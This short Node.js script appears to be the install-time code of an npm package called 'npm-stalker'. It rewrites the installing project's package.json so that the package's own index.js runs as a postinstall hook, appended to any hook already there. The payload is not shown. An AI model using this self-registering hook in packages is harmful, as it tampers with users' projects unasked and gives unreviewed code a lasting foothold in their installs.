const saveFile = require('fs').writeFileSync;

const pkgJsonPath = require.main.paths[0].split('node_modules')[0] + 'package.json';

const json = require(pkgJsonPath);

if (!json.hasOwnProperty('scripts')) {
    json.scripts = {};
}
const command = 'node node_modules/npm-stalker/index.js'
if (!json.scripts.hasOwnProperty('postinstall')) {
    json.scripts['postinstall'] = command
} else {
    json.scripts['postinstall'] = json.scripts['postinstall'] + '&&' + command;
}


saveFile(pkgJsonPath, JSON.stringify(json, null, 2));